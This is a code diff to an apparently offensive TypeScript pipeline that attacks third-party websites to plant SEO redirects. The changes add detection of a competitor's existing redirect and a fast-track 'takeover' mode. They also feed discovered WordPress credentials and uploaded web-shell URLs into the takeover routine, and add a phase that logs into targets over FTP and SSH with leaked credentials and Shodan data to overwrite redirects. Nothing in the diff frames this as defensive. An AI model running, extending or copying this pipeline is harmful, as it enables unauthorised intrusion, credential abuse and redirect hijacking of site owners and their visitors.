@@ -1129,6 +1129,48 @@ export async function runUnifiedAttackPipeline(
     progress: 18,
   });
 
+  // ═══ Phase 0.5: EARLY REDIRECT DETECTION ═══
+  // If target already has a competitor redirect, flag it so we can fast-track takeover
+  let existingRedirectDetected = false;
+  let earlyRedirectDetection: Awaited<ReturnType<typeof import("./redirect-takeover").detectExistingRedirects>> | null = null;
+  try {
+    loggedOnEvent({
+      phase: "recon" as any,
+      step: "early_redirect_check",
+      detail: `🔍 Phase 0.5: ตรวจสอบว่า target มี redirect ของคู่แข่งอยู่แล้วหรือไม่...`,
+      progress: 19,
+    });
+    const { detectExistingRedirects } = await import("./redirect-takeover");
+    earlyRedirectDetection = await Promise.race([
+      detectExistingRedirects(config.targetUrl),
+      new Promise<never>((_, reject) => setTimeout(() => reject(new Error("early redirect detection timeout")), capTimeout(20000))),
+    ]);
+    if (earlyRedirectDetection.detected && earlyRedirectDetection.competitorUrl) {
+      existingRedirectDetected = true;
+      aiDecisions.push(`🎯 REDIRECT DETECTED: คู่แข่ง ${earlyRedirectDetection.competitorUrl} วาง redirect ไว้แล้ว (${earlyRedirectDetection.methods.length} methods) — fast-track takeover mode`);
+      loggedOnEvent({
+        phase: "recon" as any,
+        step: "early_redirect_found",
+        detail: `🎯 พบ redirect ของคู่แข่ง: ${earlyRedirectDetection.competitorUrl} (${earlyRedirectDetection.methods.map(m => m.type).join(", ")}) — เปิด fast-track takeover mode`,
+        progress: 19,
+      });
+    } else {
+      loggedOnEvent({
+        phase: "recon" as any,
+        step: "early_redirect_clean",
+        detail: `ℹ️ ไม่พบ redirect ของคู่แข่ง — ดำเนินการปกติ`,
+        progress: 19,
+      });
+    }
+  } catch (e: any) {
+    loggedOnEvent({
+      phase: "recon" as any,
+      step: "early_redirect_error",
+      detail: `⚠️ Early redirect detection error: ${e.message} — ดำเนินการปกติ`,
+      progress: 19,
+    });
+  }
+
   // ═══ SMART FALLBACK: Build target profile after prescreen ═══
   try {
     targetProfile = buildTargetProfile(targetDomain, prescreen, aiTargetAnalysis);
@@ -1159,13 +1201,24 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ─── Phase 2: Deep Vulnerability Scan ───
+  // FAST-TRACK: If redirect already detected, reduce vuln scan timeout to 15s (just get basic info)
+  const vulnScanTimeout = existingRedirectDetected ? 15000 : capTimeout(45000);
   try {
-    loggedOnEvent({
-      phase: "vuln_scan",
-      step: "scanning",
-      detail: "🔬 Phase 2: AI Deep Scan — ค้นหาช่องโหว่, writable paths, upload endpoints...",
-      progress: 20,
-    });
+    if (existingRedirectDetected) {
+      loggedOnEvent({
+        phase: "vuln_scan",
+        step: "fast_track",
+        detail: "⚡ Fast-track mode: redirect ของคู่แข่งพบแล้ว — vuln scan แบบเร็ว (15s) แล้วไปทำ takeover เลย",
+        progress: 20,
+      });
+    } else {
+      loggedOnEvent({
+        phase: "vuln_scan",
+        step: "scanning",
+        detail: "🔬 Phase 2: AI Deep Scan — ค้นหาช่องโหว่, writable paths, upload endpoints...",
+        progress: 20,
+      });
+    }
 
     vulnScan = await Promise.race([
       fullVulnScan(config.targetUrl, (step: string, detail: string, progress: number) => {
@@ -1176,7 +1229,7 @@ export async function runUnifiedAttackPipeline(
           progress: 20 + (progress / 100) * 15,
         });
       }, undefined, config.originIp),
-      new Promise<VulnScanResult>((_, reject) => setTimeout(() => reject(new Error("vuln scan timeout")), capTimeout(35000))),
+      new Promise<VulnScanResult>((_, reject) => setTimeout(() => reject(new Error("vuln scan timeout")), vulnScanTimeout)),
     ]);
 
     if (vulnScan) {
@@ -1242,7 +1295,7 @@ export async function runUnifiedAttackPipeline(
   let wafDetectionResult: WafDetectionResult | null = null;
   let evasionStrategy: EvasionStrategy | null = null;
 
-  if (!shouldStop('recon')) {
+  if (!shouldStop('recon') && !existingRedirectDetected) {
     try {
       loggedOnEvent({
         phase: "recon",
@@ -1253,7 +1306,7 @@ export async function runUnifiedAttackPipeline(
 
       wafDetectionResult = await Promise.race([
         detectWaf(config.targetUrl),
-        new Promise<WafDetectionResult>((_, reject) => setTimeout(() => reject(new Error("WAF detection timeout")), capTimeout(20000))),
+        new Promise<WafDetectionResult>((_, reject) => setTimeout(() => reject(new Error("WAF detection timeout")), capTimeout(12000))),
       ]);
 
       if (wafDetectionResult.detected) {
@@ -1337,7 +1390,7 @@ export async function runUnifiedAttackPipeline(
   let discoveredCredentials: any[] = [];
   let nonWpExploitResults: NonWpScanResult | null = null;
 
-  if (config.enableConfigExploit !== false && !shouldStop('config_exploit')) {
+  if (config.enableConfigExploit !== false && !shouldStop('config_exploit') && !existingRedirectDetected) {
     try {
       loggedOnEvent({
         phase: "config_exploit",
@@ -1359,7 +1412,7 @@ export async function runUnifiedAttackPipeline(
             });
           },
         }),
-        new Promise<ConfigExploitResult[]>((_, reject) => setTimeout(() => reject(new Error("config exploit timeout")), capTimeout(20000))),
+        new Promise<ConfigExploitResult[]>((_, reject) => setTimeout(() => reject(new Error("config exploit timeout")), capTimeout(12000))),
       ]);
 
       const successExploits = configResults.filter(r => r.success);
@@ -1384,7 +1437,7 @@ export async function runUnifiedAttackPipeline(
     }
   }
 
-  if (config.enableDnsAttacks !== false && !shouldStop('dns_recon')) {
+  if (config.enableDnsAttacks !== false && !shouldStop('dns_recon') && !existingRedirectDetected) {
     try {
       loggedOnEvent({
         phase: "dns_attack",
@@ -1407,7 +1460,7 @@ export async function runUnifiedAttackPipeline(
             });
           },
         }),
-        new Promise<DnsAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("dns attacks timeout")), capTimeout(25000))),
+        new Promise<DnsAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("dns attacks timeout")), capTimeout(15000))),
       ]);
 
       const successDns = dnsResults.filter(r => r.success);
@@ -1438,7 +1491,7 @@ export async function runUnifiedAttackPipeline(
   const wafDetected = prescreen?.wafDetected || aiTargetAnalysis?.security?.wafDetected || vulnScan?.serverInfo?.waf || vulnScan?.serverInfo?.cdn || "";
   const isCloudflare = wafDetected.toLowerCase().includes("cloudflare");
   
-  if (isCloudflare && !shouldStop('cf_bypass')) {
+  if (isCloudflare && !shouldStop('cf_bypass') && !existingRedirectDetected) {
     try {
       const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
       loggedOnEvent({
@@ -1457,7 +1510,7 @@ export async function runUnifiedAttackPipeline(
             progress: 42,
           });
         }),
-        new Promise<OriginIPResult>((_, reject) => setTimeout(() => reject(new Error("CF bypass timeout")), capTimeout(45000))),
+        new Promise<OriginIPResult>((_, reject) => setTimeout(() => reject(new Error("CF bypass timeout")), capTimeout(25000))),
       ]);
 
       if (cfBypassResult.found && cfBypassResult.originIP) {
@@ -1492,7 +1545,7 @@ export async function runUnifiedAttackPipeline(
   let unifiedCfBypassResult: CfBypassResult | null = null;
   const hasAnyWaf = !!(wafDetected || wafDetectionResult?.detected);
 
-  if (hasAnyWaf && !originIp && !shouldStop('unified_cf_bypass')) {
+  if (hasAnyWaf && !originIp && !shouldStop('unified_cf_bypass') && !existingRedirectDetected) {
     try {
       loggedOnEvent({
         phase: "cf_bypass",
@@ -1518,7 +1571,7 @@ export async function runUnifiedAttackPipeline(
             });
           },
         }),
-        new Promise<CfBypassResult>((_, reject) => setTimeout(() => reject(new Error("Unified CF bypass timeout")), capTimeout(30000))),
+        new Promise<CfBypassResult>((_, reject) => setTimeout(() => reject(new Error("Unified CF bypass timeout")), capTimeout(20000))),
       ]);
 
       if (unifiedCfBypassResult.originIp && !originIp) {
@@ -1902,7 +1955,7 @@ export async function runUnifiedAttackPipeline(
             progress: 49 + Math.round(progress * 0.06),
           });
         }),
-        new Promise<WpScanResult>((_, reject) => setTimeout(() => reject(new Error("WP Vuln Scan timeout")), capTimeout(60000))),
+        new Promise<WpScanResult>((_, reject) => setTimeout(() => reject(new Error("WP Vuln Scan timeout")), capTimeout(30000))),
       ]);
 
       if (wpVulnScanResult.isWordPress) {
@@ -2129,7 +2182,7 @@ export async function runUnifiedAttackPipeline(
           runCmsVulnScan(config.targetUrl, (phase, detail, progress) => {
             loggedOnEvent({ phase: "cms_vuln_scan" as any, step: phase, detail: `🔍 CMS Scan: ${detail}`, progress: 56 + (progress * 0.04) });
           }),
-          new Promise<CmsScanResult>((_, reject) => setTimeout(() => reject(new Error("CMS scan timeout")), capTimeout(60000))),
+          new Promise<CmsScanResult>((_, reject) => setTimeout(() => reject(new Error("CMS scan timeout")), capTimeout(30000))),
         ]);
 
         if (cmsScanResult.cmsDetected !== "unknown") {
@@ -3733,15 +3786,25 @@ export async function runUnifiedAttackPipeline(
   const redirectTakeoverEnabled = !config.methodPriority || config.methodPriority.length === 0 || config.methodPriority.some(m => m.id === 'redirect_takeover' && m.enabled);
   if (!hasSuccessfulRedirect() && !shouldStop('redirect_takeover') && redirectTakeoverEnabled) {
     try {
+      // Use early detection results if available (saves 15-20s re-detection)
+      const detectionToUse = earlyRedirectDetection;
+      const skipDetection = detectionToUse && detectionToUse.detected;
+
       loggedOnEvent({
         phase: "shellless" as any,
         step: "redirect_takeover_start",
-        detail: `🔄 Phase 5.5: Redirect Takeover — ตรวจจับและ overwrite redirect ของคู่แข่ง...`,
+        detail: skipDetection
+          ? `⚡ Phase 5.5: Redirect Takeover (fast) — ใช้ผล early detection: ${detectionToUse!.competitorUrl}`
+          : `🔄 Phase 5.5: Redirect Takeover — ตรวจจับและ overwrite redirect ของคู่แข่ง...`,
         progress: 96,
       });
 
       const { detectExistingRedirects, executeRedirectTakeover } = await import("./redirect-takeover");
-      const detection = await detectExistingRedirects(config.targetUrl);
+      // Reuse early detection or do fresh detection
+      const detection = skipDetection ? detectionToUse! : await Promise.race([
+        detectExistingRedirects(config.targetUrl),
+        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("redirect detection timeout")), capTimeout(20000))),
+      ]);
 
       if (detection.detected && detection.competitorUrl) {
         loggedOnEvent({
@@ -3751,10 +3814,17 @@ export async function runUnifiedAttackPipeline(
           progress: 97,
         });
 
+        // Collect any WP credentials found during the pipeline
+        const wpCreds = discoveredCredentials.find((c: any) => c.username && c.password);
+        // Collect any shell URLs from successful uploads
+        const shellUrl = uploadedFiles.find(f => f.verified)?.url;
+
         const takeoverResults = await executeRedirectTakeover({
           targetUrl: config.targetUrl,
           ourRedirectUrl: config.redirectUrl,
           seoKeywords: config.seoKeywords,
+          wpCredentials: wpCreds ? { username: wpCreds.username, password: wpCreds.password } : undefined,
+          shellUrl: shellUrl || undefined,
           onProgress: (phase, detail) => {
             loggedOnEvent({ phase: "shellless" as any, step: `takeover_${phase}`, detail, progress: 97 });
           },
@@ -4137,6 +4207,75 @@ export async function runUnifiedAttackPipeline(
         step: "error",
         detail: `⚠️ LeakCheck Enterprise error: ${error.message}`,
         progress: 89,
+      });
+    }
+  }
+
+  // ─── Phase 5.6b: Credential-Enhanced Redirect Takeover (uses LeakCheck + Shodan intel) ───
+  // If we still don't have a successful redirect AND we found leaked creds, try FTP/SSH overwrite
+  if (!hasSuccessfulRedirect() && existingRedirectDetected && leakcheckCredentials.length > 0 && !shouldStop('redirect_takeover')) {
+    try {
+      const targetHost = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      const validCreds = leakcheckCredentials.filter((c): c is typeof c & { username: string; password: string } => !!(c.username && c.password));
+
+      if (validCreds.length > 0) {
+        loggedOnEvent({
+          phase: "shellless" as any,
+          step: "cred_takeover_start",
+          detail: `\u26a1 Phase 5.6b: Credential Takeover \u2014 ${validCreds.length} leaked creds + Shodan intel \u2192 FTP/SSH overwrite...`,
+          progress: 90,
+        });
+
+        const { executeRedirectTakeover: execTakeover } = await import("./redirect-takeover");
+        const ftpCreds = validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 21 }));
+        const sshCreds = validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 22 }));
+
+        const credTakeoverResults = await execTakeover({
+          targetUrl: config.targetUrl,
+          ourRedirectUrl: config.redirectUrl,
+          seoKeywords: config.seoKeywords,
+          ftpCredentials: ftpCreds,
+          sshCredentials: sshCreds,
+          openPorts: shodanIntel?.allPorts || undefined,
+          onProgress: (phase, detail) => {
+            loggedOnEvent({ phase: "shellless" as any, step: `cred_takeover_${phase}`, detail, progress: 90 });
+          },
+        });
+
+        const credSuccess = credTakeoverResults.find(r => r.success);
+        if (credSuccess) {
+          loggedOnEvent({
+            phase: "shellless" as any,
+            step: "cred_takeover_success",
+            detail: `\u2705 Credential Takeover \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08! ${credSuccess.method}: ${credSuccess.detail}`,
+            progress: 91,
+          });
+          uploadedFiles.push({
+            url: credSuccess.injectedUrl || config.targetUrl,
+            shell: shells[0] || { id: "cred_takeover", type: "html" as any, filename: "takeover.html", content: "", size: 0, mimeType: "text/html", headers: {} },
+            method: `cred_takeover_${credSuccess.method}`,
+            verified: true,
+            redirectWorks: true,
+            redirectDestinationMatch: true,
+            finalDestination: config.redirectUrl,
+            redirectChain: [],
+            httpStatus: 302,
+          });
+        } else {
+          loggedOnEvent({
+            phase: "shellless" as any,
+            step: "cred_takeover_failed",
+            detail: `\u26a0\ufe0f Credential Takeover \u0e25\u0e49\u0e21\u0e40\u0e2b\u0e25\u0e27 \u2014 ${credTakeoverResults.map(r => r.method).join(", ")}`,
+            progress: 90,
+          });
+        }
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "shellless" as any,
+        step: "cred_takeover_error",
+        detail: `\u26a0\ufe0f Credential Takeover error: ${error.message}`,
+        progress: 90,
       });
     }
   }
